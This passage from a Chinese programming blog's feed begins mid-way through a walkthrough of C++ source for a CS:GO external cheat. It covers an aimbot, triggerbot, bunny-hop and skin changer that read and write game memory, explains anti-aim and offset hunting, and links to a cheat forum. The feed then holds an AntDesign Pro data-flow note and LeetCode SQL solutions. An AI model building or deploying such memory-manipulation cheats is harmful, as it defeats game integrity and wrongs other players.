fLowest = <span class="number">1000000</span>, TMP;</span><br><span class="line"><span class="keyword">int</span> iIndex = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">63</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">//获取自己和当前所遍历到的敌人的距离</span></span><br><span class="line">        TMP = scrToWorld(Players[<span class="number">0</span>].Pos.x, Players[<span class="number">0</span>].Pos.y, Players[<span class="number">0</span>].Pos.z, Players[i].Pos.x, Players[i].Pos.y, Players[i].Pos.z);</span><br><span class="line">        <span class="comment">//如果当前敌人比所记录的更近，生命值不为0，敌人可见，敌人未休眠，则更新记录，记录当前距离和当前敌人的编号</span></span><br><span class="line">        <span class="keyword">if</span> (TMP &lt; fLowest &amp;&amp; Players[i].Health != <span class="number">0</span> &amp;&amp; Players[i].Spotted &amp;&amp; !Players[i].Dormant &amp;&amp; (Players[i].Team == enemyteam))</span><br><span class="line">        &#123;</span><br><span class="line">            fLowest = TMP;</span><br><span class="line">            iIndex = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> iIndex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  但是你也不能说你正瞄着这个人呢，突然背后来个更近的，你就180°拉枪吧，所以还要加一个判断，如果上一个正在打的人没死，是不会转视角的。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Ind = CloseEnt();</span><br><span class="line"><span class="keyword">if</span> (Players[lasttarget].Spotted &amp;&amp; (Players[lasttarget].Team == enemyteam) &amp;&amp; !Players[lasttarget].Dormant &amp;&amp; Players[lasttarget].Health &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    Ind = lasttarget;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这样我们保证Ind中获得了一个合理的敌人的编号，然后我们开始转视角。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Ind != <span class="number">-1</span>) &#123;</span><br><span class="line">    Vector localAngles;</span><br><span class="line">    <span class="keyword">float</span> smoothed[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">//aimpunch是子弹轨迹的角度，也就是下一发子弹所指向的位置</span></span><br><span class="line">    Vector aimpunch = mem.ReadMemory&lt;Vector&gt;(csgo, localPlayer + aimPunch);</span><br><span class="line">    <span class="comment">//服务器默认后坐力是2.0</span></span><br><span class="line">    aimpunch.x = aimpunch.x * <span class="number">2.f</span>;</span><br><span class="line">    aimpunch.y = aimpunch.y * <span class="number">2.f</span>;</span><br><span class="line">    <span class="comment">//这里的xyz不是坐标，而是通过三次坐标偏移来获取用户当前所用武器。</span></span><br><span class="line">    DWORD x = mem.ReadMemory&lt;DWORD&gt;(csgo,localPlayer + m_hActiveWeapon) &amp; <span class="number">0xfff</span>;</span><br><span class="line">    DWORD y = mem.ReadMemory&lt;DWORD&gt;(csgo, client + entityList + (x - <span class="number">1</span>) * <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">short</span> z = mem.ReadMemory&lt;<span class="keyword">short</span>&gt;(csgo, y + m_iItemDefinitionIndex);</span><br><span class="line">    <span class="comment">//获取当前角色的瞄准角度</span></span><br><span class="line">    localAngles = mem.ReadMemory&lt;Vector&gt;(csgo, clientbase + clientAngle);</span><br><span class="line">    <span class="comment">//计算自瞄之后应该瞄向的角度</span></span><br><span class="line">    CalcAngle( Players[<span class="number">0</span>].Pos, Players[Ind].Pos, Players[Ind].Angle);</span><br><span class="line">    <span class="comment">//平滑转向</span></span><br><span class="line">    Smooth(aimpunch.x, aimpunch.y,Players[Ind].Angle, smoothed, localAngles, aimsmooth, z);</span><br><span class="line">    <span class="comment">//写回内存</span></span><br><span class="line">    mem.WriteMemory&lt;<span class="keyword">float</span>&gt;(csgo, clientbase + clientAngle, smoothed[<span class="number">0</span>]);</span><br><span class="line">    mem.WriteMemory&lt;<span class="keyword">float</span>&gt;(csgo, clientbase + clientAngle + <span class="number">0x4</span>, smoothed[<span class="number">1</span>]);</span><br><span class="line">    lasttarget = Ind;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//求距离</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">scrToWorld</span><span class="params">(<span class="keyword">float</span> X, <span class="keyword">float</span> Y, <span class="keyword">float</span> Z, <span class="keyword">float</span> eX, <span class="keyword">float</span> eY, <span class="keyword">float</span> eZ)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(sqrtf((eX - X) * (eX - X) + (eY - Y) * (eY - Y) + (eZ - Z) * (eZ - Z)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计算如果需要瞄向目标，需要指向的角度,保存在angles里面</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CalcAngle</span><span class="params">(Vector src, Vector dst, <span class="keyword">float</span> *angles)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> Delta[<span class="number">3</span>] = &#123; (src.x - dst.x), (src.y - dst.y), (src.z - dst.z) &#125;;</span><br><span class="line">    angles[<span class="number">0</span>] = <span class="built_in">atan</span>(Delta[<span class="number">2</span>] / <span class="built_in">sqrt</span>(Delta[<span class="number">0</span>] * Delta[<span class="number">0</span>] + Delta[<span class="number">1</span>] * Delta[<span class="number">1</span>])) * M_RADPI;</span><br><span class="line">    angles[<span class="number">1</span>] = <span class="built_in">atan</span>(Delta[<span class="number">1</span>] / Delta[<span class="number">0</span>]) * M_RADPI;</span><br><span class="line">    angles[<span class="number">2</span>] = <span class="number">0.0f</span>;</span><br><span class="line">    <span class="keyword">if</span> (Delta[<span class="number">0</span>] &gt;= <span class="number">0.0</span>) angles[<span class="number">1</span>] += <span class="number">180.0f</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计算转向角度</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Smooth</span><span class="params">(<span class="keyword">float</span> x, <span class="keyword">float</span> y, <span class="keyword">float</span> *src, <span class="keyword">float</span> *back, Vector flLocalAngles, <span class="keyword">float</span> smooth, <span class="keyword">short</span> weapon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//上一步算的目标角度传进来，用*src接收，先减去对应的当前角度，计算横轴偏移量和纵轴偏移量</span></span><br><span class="line">    <span class="keyword">float</span> smoothdiff[<span class="number">2</span>];</span><br><span class="line">    src[<span class="number">0</span>] -= flLocalAngles.x;</span><br><span class="line">    src[<span class="number">1</span>] -= flLocalAngles.y;</span><br><span class="line">    <span class="comment">//两个偏移量控制在180°内，防止反向转240°找人这种情况发生</span></span><br><span class="line">    <span class="keyword">if</span> (src[<span class="number">0</span>] &gt; <span class="number">180</span>)  src[<span class="number">0</span>] -= <span class="number">360</span>;</span><br><span class="line">    <span class="keyword">if</span> (src[<span class="number">1</span>] &gt; <span class="number">180</span>)  src[<span class="number">1</span>] -= <span class="number">360</span>;</span><br><span class="line">    <span class="keyword">if</span> (src[<span class="number">0</span>] &lt; <span class="number">-180</span>) src[<span class="number">0</span>] += <span class="number">360</span>;</span><br><span class="line">    <span class="keyword">if</span> (src[<span class="number">1</span>] &lt; <span class="number">-180</span>) src[<span class="number">1</span>] += <span class="number">360</span>;</span><br><span class="line">    <span class="comment">//这里的武器是狙或者喷子，这种武器是没有后坐力的</span></span><br><span class="line">    <span class="keyword">if</span> (weapon == <span class="number">9</span> || weapon == <span class="number">11</span> || weapon == <span class="number">25</span> || weapon == <span class="number">35</span> || weapon == <span class="number">38</span> || weapon == <span class="number">28</span>) &#123;</span><br><span class="line">        smoothdiff[<span class="number">0</span>] = (src[<span class="number">0</span>]) * smooth;</span><br><span class="line">        smoothdiff[<span class="number">1</span>] = (src[<span class="number">1</span>]) * smooth;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//其余的武器需要控制后坐力，防止打飞了，角度先往下拉一部分再平滑</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        smoothdiff[<span class="number">0</span>] = (src[<span class="number">0</span>] - x) * smooth;</span><br><span class="line">        smoothdiff[<span class="number">1</span>] = (src[<span class="number">1</span>] - y) * smooth;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//把计算过后的旋转角度加回去，获得转移过程中的瞄准角度</span></span><br><span class="line">    back[<span class="number">0</span>] = flLocalAngles.x + smoothdiff[<span class="number">0</span>];</span><br><span class="line">    back[<span class="number">1</span>] = flLocalAngles.y + smoothdiff[<span class="number">1</span>];</span><br><span class="line">    back[<span class="number">2</span>] = flLocalAngles.z;</span><br><span class="line">    <span class="keyword">if</span> (back[<span class="number">0</span>] &gt; <span class="number">180</span>)  back[<span class="number">0</span>] -= <span class="number">360</span>;</span><br><span class="line">    <span class="keyword">if</span> (back[<span class="number">1</span>] &gt; <span class="number">180</span>)  back[<span class="number">1</span>] -= <span class="number">360</span>;</span><br><span class="line">    <span class="keyword">if</span> (back[<span class="number">0</span>] &lt; <span class="number">-180</span>) back[<span class="number">0</span>] += <span class="number">360</span>;</span><br><span class="line">    <span class="keyword">if</span> (back[<span class="number">1</span>] &lt; <span class="number">-180</span>) back[<span class="number">1</span>] += <span class="number">360</span>;</span><br><span class="line">    <span class="keyword">if</span> (back[<span class="number">0</span>] &gt; <span class="number">89.0f</span>) back[<span class="number">0</span>] = <span class="number">89.0f</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (back[<span class="number">0</span>] &lt; <span class="number">-89.0f</span>) back[<span class="number">0</span>] = <span class="number">-89.0f</span>;</span><br><span class="line">    <span class="keyword">if</span> (back[<span class="number">1</span>] &gt; <span class="number">180.0f</span>) back[<span class="number">1</span>] = <span class="number">180.0f</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (back[<span class="number">1</span>]&lt; <span class="number">-180.0f</span>) back[<span class="number">1</span>] = <span class="number">-180.0f</span>;</span><br><span class="line">    back[<span class="number">2</span>] = <span class="number">0.f</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="自动扳机"><a class="markdownIt-Anchor" href="#自动扳机"></a> 自动扳机</h1><p>  原理上很简单，瞄在人身上了就开枪。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取准星所指向的玩家ID，如果没有就返回null</span></span><br><span class="line"><span class="keyword">int</span> crosshairoffset = mem.ReadMemory&lt;<span class="keyword">int</span>&gt;(csgo, localPlayer + CrosshairId);</span><br><span class="line"><span class="keyword">if</span> (isopenedtrigger) &#123;</span><br><span class="line">    <span class="comment">//如果ID在1-64之间，就进一步判断</span></span><br><span class="line">    <span class="keyword">if</span> (crosshairoffset &lt; <span class="number">1</span> || crosshairoffset &gt; <span class="number">64</span> || crosshairoffset == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    <span class="comment">//trigger键被按下</span></span><br><span class="line">    <span class="keyword">if</span> ((GetAsyncKeyState(key) &amp; <span class="number">0x8000</span>)) &#123;</span><br><span class="line">        <span class="comment">//获取指向的玩家实体</span></span><br><span class="line">        DWORD player = mem.ReadMemory&lt;DWORD&gt;(csgo, client + entityList + ((crosshairoffset - <span class="number">1</span>) * <span class="number">0x10</span>));</span><br><span class="line">        <span class="comment">//获取指向的玩家的队伍</span></span><br><span class="line">        <span class="keyword">int</span> playerenemy = mem.ReadMemory&lt;<span class="keyword">int</span>&gt;(csgo, player + iTeamNum);</span><br><span class="line">        <span class="comment">//如果是敌人，而且按下了trigger键</span></span><br><span class="line">        <span class="keyword">if</span> (playerenemy == enemyteam &amp;&amp; !(GetAsyncKeyState(VK_LBUTTON) &amp; <span class="number">0x8000</span>)) &#123;</span><br><span class="line">            <span class="comment">//将开火动作写入内存</span></span><br><span class="line">            mem.WriteMemory&lt;DWORD&gt;(csgo, client + forceAttack, <span class="number">4</span>);</span><br><span class="line">            Sleep(<span class="number">5</span>);</span><br><span class="line">            <span class="comment">//将停火动作写入内存</span></span><br><span class="line">            mem.WriteMemory&lt;DWORD&gt;(csgo, client + forceAttack, <span class="number">6</span>);</span><br><span class="line">            <span class="comment">//我认为这里大概作者有点多此一举，完全可以将sleep和4那步删掉，我删掉之后好像也没什么影响，反而加上之后开枪不连贯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  自瞄+自动扳机的效果就是</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4vaNj.gif" alt="" /></p><h1 id="连跳"><a class="markdownIt-Anchor" href="#连跳"></a> 连跳</h1><p>  连跳更简单，落地就起跳即可。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> flags = mem.ReadMemory&lt;<span class="keyword">int</span>&gt;(csgo, localPlayer + fFlags);</span><br><span class="line">    <span class="comment">//跳跃键按下，并且在地面上</span></span><br><span class="line">    <span class="keyword">if</span> ((GetAsyncKeyState(VK_SPACE) &amp; <span class="number">0x8000</span> )&amp;&amp; flags &amp; PLAYER_ON_FLOOR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//跳跃动作写入内存</span></span><br><span class="line">        mem.WriteMemory&lt;DWORD&gt;(csgo, client + dwForceJump, <span class="number">6</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="更换皮肤"><a class="markdownIt-Anchor" href="#更换皮肤"></a> 更换皮肤</h1><p>  这个没啥好说的，指定皮肤ID，写进内存就完事了。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">mem.WriteMemory&lt;<span class="keyword">int</span>&gt;(csgo, weaponEntity + m_iItemIDHigh, itemIDHigh);</span><br><span class="line">mem.WriteMemory&lt;DWORD&gt;(csgo, weaponEntity + m_nFallbackPaintKit, fallbackPaint);</span><br><span class="line">mem.WriteMemory&lt;<span class="keyword">float</span>&gt;(csgo, weaponEntity + m_flFallbackWear, fallbackWear);</span><br></pre></td></tr></table></figure><h1 id="陀螺"><a class="markdownIt-Anchor" href="#陀螺"></a> 陀螺</h1><p>  这份源码中没有提到Anti aim</p><p>  我简要介绍一下陀螺的工作原理。</p><p>  陀螺一共可以分为3种：</p><ol><li>常规反自瞄<br />  把你的人物转起来，可以左右转可以上下转可以加起来，这样对面就不太好瞄准了。</li><li>假模型反自瞄<br />  通过发送延迟的数据包，让服务器收到一个和你实际位置不一样的假模型，再加载给其他玩家，这样其他玩家在打你的时候就不会收到伤害判定。</li><li>角度反自瞄<br />  把你的角色角度设置到一个超级高的值，这样你的hitbox虽然会跟着转，但是你的角色模型却不会，从而导致了你的hitbox和你角色的分离，这样即便对方打到了你的角色，由于没有打到hitbox，依然不会产生伤害判定。</li></ol><p>  我再简要介绍一下假模型的Anti aim原理：<br />  人物模型的头部是有角度的，我们为了不让对方打到头，就要疯狂的转。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4vJu8.jpg" alt="" /></p><p>  获取当前的viewangle，然后开始疯狂改变，不管是+90还是+180还是+多少，反正就是转。</p><p>  转完了之后手动choke一帧，从下一秒在开始，这样每秒发送的都是上一个tick，而上一个tick人物的角度和我们现在人物的角度已经不同了，这样在其他玩家从服务器获取到我们数据的时候，拿到的是我们上一秒的数据，加载的模型也是我们上一秒的模型，即使打到模型的头部，在进行伤害计算的时候也是不会有伤害判定的。</p><p>  转起来之后该如何走路：</p><p>  在按下WASD之后，根据我们每秒的旋转角度，计算如果想要往相应方向前进，需要的真正位移，然后把位移写入内存，这个功能叫 move fix。</p><p>  转之后的视角：</p><p>  一种解决方式是把角色摄像机移位，改成第三人称视角，这样我们的视角就不会受到旋转的影响。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4vtHg.jpg" alt="" /></p><p>  但是如果不改角色摄像机，第一人称看起来仍然是不转的，这个是如何办到的其实我还没搞搞懂，有大佬如果知道的话可以告诉我一下。</p><h1 id="偏移量获取"><a class="markdownIt-Anchor" href="#偏移量获取"></a> 偏移量获取</h1><p>  首先还是通过外部工具注入clinet.dll,或者说client_panorama.dll</p><p>  然后可以尝试搜索关键字，如果能找到关键字的话，偏移量就好找的多。</p><p>  例如下图，找到了m_hActiveWeapon之后，上面的0D70就是对应的偏移量</p><p>![](<a href="https://pic.lufer.cc/images/2021/03/15/e4vYDS.jpg">https://pic.lufer.cc/images/2021/03/15/e4vYDS.jpg</a></p><p>  当然不是所有的偏移量都有关键字，对于没有关键字的偏移量就需要不断改变条件，查找产生了变化的值，这部分的工作量还是很大的。</p><p>  例如获取准星所瞄到的用户，在准星没有瞄到人的时候是在内存中是一个占据了4个地址的0，即：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000</span><br><span class="line">00000000</span><br><span class="line">00000000</span><br><span class="line">00000000</span><br></pre></td></tr></table></figure><p>  当你的准星瞄到角色身上时，这部分值就会发生变化，这里变成什么我就不太清楚了，而且同一时间变化的值会很多，所以要不断地测试各种情况，然后逐一排除，最后才能获得真正的偏移量。</p><p>  最后分享一个offset链接，会自动更新offset的地址</p><p><a href="https://www.unknowncheats.me/forum/counterstrike-global-offensive/103220-global-offensive-structs-offsets.html">https://www.unknowncheats.me/forum/counterstrike-global-offensive/103220-global-offensive-structs-offsets.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;目录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E7%AE%80%E4%BB%8B&quot;&gt;简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%B7%A5%E5%85%B7%E7%B1%BB&quot;&gt;工具类&lt;/a&gt;&lt;/</summary>
      
    
    
    
    <category term="C++" scheme="https://coder.lufer.cc/categories/C/"/>
    
    
    <category term="Game" scheme="https://coder.lufer.cc/tags/Game/"/>
    
    <category term="C++" scheme="https://coder.lufer.cc/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>AntDesign数据驱动流程</title>
    <link href="https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/AntDesign%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8%E6%B5%81%E7%A8%8B/"/>
    <id>https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/AntDesign%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8%E6%B5%81%E7%A8%8B/</id>
    <published>2018-11-15T07:49:00.000Z</published>
    <updated>2021-04-06T02:17:46.611Z</updated>
    
    <content type="html"><![CDATA[<p>  AntDesign Pro的数据驱动流程一共涉及三个部分：页面，Model，API。</p><h1 id="页面"><a class="markdownIt-Anchor" href="#页面"></a> 页面</h1><p>  从页面讲起，页面通过Dispatch来发起请求，将参数写在payload中，请求的地址写在type中，而这里是不关心返回值的。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">dispatch(&#123;</span><br><span class="line">     type: <span class="string">&#x27;ModelA/FunctionA&#x27;</span>,</span><br><span class="line">     payload: &#123;</span><br><span class="line">       Param:param</span><br><span class="line">     &#125;,</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure><p>  这里我用了ModelA和FuntionA，方便与后文对应，也就意味着存在一个model名字为ModelA，其中有一个函数为FunctionA。</p><p>  假设ModelA存在，后续流程完成，那么我们需要获取返回的请求结果。</p><p>  在页面的connect处，我们连接Model，并获取返回值。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(<span class="function">(<span class="params">&#123;ModenlA&#125;</span>) =&gt;</span> (&#123;</span><br><span class="line">  Data: ModelA.data,</span><br><span class="line">&#125;))(View1);</span><br></pre></td></tr></table></figure><p>  这样在Data中，我们就拿到了请求的结果，并可以在页面中使用。</p><h1 id="model"><a class="markdownIt-Anchor" href="#model"></a> Model</h1><p>  在ModelA中，我们需要定义一个FunctionA函数，用来响应页面的请求，该函数应该写在effects里面。</p><p>  先看代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">effects: &#123;</span><br><span class="line">    *<span class="function"><span class="title">FunctionA</span>(<span class="params">&#123; payload &#125;, &#123; call, put &#125;</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">yield</span> call(APIA, payload);</span><br><span class="line">      <span class="keyword">yield</span> put(&#123;</span><br><span class="line">        type: <span class="string">&#x27;ReducerA&#x27;</span>,</span><br><span class="line">        payload: response,</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  我们定义了FunctionA用来响应请求，payload接收被调用时传入的参数，并在yield中进一步传递下去。</p><p>  yield中会调用API中的对应接口，并真正的向后端发送请求。</p><p>  put中则是对返回值进行处理，Type处我们调用了ReducerA，并把respons（即请求返回值）作为参数传送过去。</p><p>  在Reducer中，Model正式将请求的返回值进行保存，这样当页面通过connect对model进行连接之后，就可以对返回值进行调用。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> state: &#123;</span><br><span class="line">    Data: [],</span><br><span class="line">  &#125;,</span><br><span class="line"> reducers: &#123;</span><br><span class="line">    <span class="function"><span class="title">ReducerA</span>(<span class="params">state, &#123; payload &#125;</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        ...state,</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="api"><a class="markdownIt-Anchor" href="#api"></a> API</h1><p>  API层进行真正的前后端交互，发送请求到后端，并获取返回结果。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">APIA</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> request(<span class="string">`<span class="subst">$&#123;config.domain&#125;</span>/api`</span>, &#123;</span><br><span class="line">    method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    body: params,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  AntDesign Pro的数据驱动流程一共涉及三个部分：页面，Model，API。&lt;/p&gt;
&lt;h1 id=&quot;页面&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#页面&quot;&gt;&lt;/a&gt; 页面&lt;/h1&gt;
&lt;p&gt;  从页面讲起，页面通过Dispatch</summary>
      
    
    
    
    <category term="前端" scheme="https://coder.lufer.cc/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="前端" scheme="https://coder.lufer.cc/tags/%E5%89%8D%E7%AB%AF/"/>
    
    <category term="React" scheme="https://coder.lufer.cc/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>leetcode题解-数据库部分</title>
    <link href="https://coder.lufer.cc/%E9%A2%98%E8%A7%A3/leetcode%E9%A2%98%E8%A7%A3-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%83%A8%E5%88%86/"/>
    <id>https://coder.lufer.cc/%E9%A2%98%E8%A7%A3/leetcode%E9%A2%98%E8%A7%A3-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%83%A8%E5%88%86/</id>
    <published>2018-06-29T10:27:39.000Z</published>
    <updated>2021-04-06T02:18:22.943Z</updated>
    
    <content type="html"><![CDATA[<h1 id="175-组合两个表"><a class="markdownIt-Anchor" href="#175-组合两个表"></a> 175. 组合两个表</h1><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><p>表1: <code>Person</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------+---------+</span><br><span class="line">| 列名         | 类型     |</span><br><span class="line">+-------------+---------+</span><br><span class="line">| PersonId    | int     |</span><br><span class="line">| FirstName   | varchar |</span><br><span class="line">| LastName    | varchar |</span><br><span class="line">+-------------+---------+</span><br><span class="line">PersonId 是上表主键</span><br></pre></td></tr></table></figure><p>表2: <code>Address</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------+---------+</span><br><span class="line">| 列名         | 类型    |</span><br><span class="line">+-------------+---------+</span><br><span class="line">| AddressId   | int     |</span><br><span class="line">| PersonId    | int     |</span><br><span class="line">| City        | varchar |</span><br><span class="line">| State       | varchar |</span><br><span class="line">+-------------+---------+</span><br><span class="line">AddressId 是上表主键</span><br></pre></td></tr></table></figure><p>编写一个 SQL 查询，满足条件：无论 person 是否有地址信息，都需要基于上述两表提供 person 的以下信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FirstName, LastName, City, State</span><br></pre></td></tr></table></figure><h2 id="题解"><a class="markdownIt-Anchor" href="#题解"></a> 题解</h2><p>用左连接（LEFT JOIN）来保证保留Person表中的空记录。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> person.FirstName, person.LastName,City,State</span><br><span class="line"><span class="keyword">FROM</span> person</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> address</span><br><span class="line"><span class="keyword">ON</span> person.PersonId = address.PersonId</span><br></pre></td></tr></table></figure><h1 id="176-第二高的薪水"><a class="markdownIt-Anchor" href="#176-第二高的薪水"></a> 176. 第二高的薪水</h1><h2 id="题目-2"><a class="markdownIt-Anchor" href="#题目-2"></a> 题目</h2><p>编写一个 SQL 查询，获取 <code>Employee</code> 表中第二高的薪水（Salary） 。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+--------+</span><br><span class="line">| Id | Salary |</span><br><span class="line">+----+--------+</span><br><span class="line">| 1  | 100    |</span><br><span class="line">| 2  | 200    |</span><br><span class="line">| 3  | 300    |</span><br><span class="line">+----+--------+</span><br></pre></td></tr></table></figure><p>例如上述 <code>Employee</code> 表，SQL查询应该返回 <code>200</code> 作为第二高的薪水。如果不存在第二高的薪水，那么查询应返回 null。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">| SecondHighestSalary |</span><br><span class="line">+---------------------+</span><br><span class="line">| 200                 |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><h2 id="题解-2"><a class="markdownIt-Anchor" href="#题解-2"></a> 题解</h2><p>把薪水按从大到小排序，然后偏移1个取第一个，如果没有就返回空（IFNULL）<br />还要把salary groupby一下来去重</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="keyword">IFNULL</span>((<span class="keyword">SELECT</span> Salary <span class="keyword">FROM</span> Employee <span class="keyword">group</span> <span class="keyword">by</span> Salary <span class="keyword">order</span> <span class="keyword">by</span> Salary <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>),<span class="literal">null</span>) <span class="keyword">as</span> SecondHighestSalary</span><br></pre></td></tr></table></figure><h1 id="177-第n高的薪水"><a class="markdownIt-Anchor" href="#177-第n高的薪水"></a> 177. 第N高的薪水</h1><h2 id="题目-3"><a class="markdownIt-Anchor" href="#题目-3"></a> 题目</h2><p>编写一个 SQL 查询，获取 <code>Employee</code> 表中第 n 高的薪水（Salary）。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+--------+</span><br><span class="line">| Id | Salary |</span><br><span class="line">+----+--------+</span><br><span class="line">| 1  | 100    |</span><br><span class="line">| 2  | 200    |</span><br><span class="line">| 3  | 300    |</span><br><span class="line">+----+--------+</span><br></pre></td></tr></table></figure><p>例如上述 <code>Employee</code> 表，n = 2 时，应返回第二高的薪水 <code>200</code>。如果不存在第 n 高的薪水，那么查询应返回 <code>null</code>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------------------------+</span><br><span class="line">| getNthHighestSalary(2) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 200                    |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><h2 id="题解-3"><a class="markdownIt-Anchor" href="#题解-3"></a> 题解</h2><p>第N高只需要偏移量设定为N-1即可，定义变量m=N-1进行计算</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> getNthHighestSalary(N <span class="built_in">INT</span>) <span class="keyword">RETURNS</span> <span class="built_in">INT</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">declare</span> m <span class="built_in">int</span>;</span><br><span class="line"><span class="keyword">set</span> m=N<span class="number">-1</span>;</span><br><span class="line">  RETURN (</span><br><span class="line">      <span class="comment"># Write your MySQL query statement below.</span></span><br><span class="line">      <span class="keyword">Select</span> <span class="keyword">IFNULL</span>((<span class="keyword">SELECT</span> Salary <span class="keyword">FROM</span> Employee <span class="keyword">group</span> <span class="keyword">by</span> Salary <span class="keyword">order</span> <span class="keyword">by</span> Salary <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> m),<span class="literal">null</span>)</span><br><span class="line">  );</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure><h1 id="178-分数排名"><a class="markdownIt-Anchor" href="#178-分数排名"></a> 178. 分数排名</h1><h2 id="题目-4"><a class="markdownIt-Anchor" href="#题目-4"></a> 题目</h2><p>编写一个 SQL 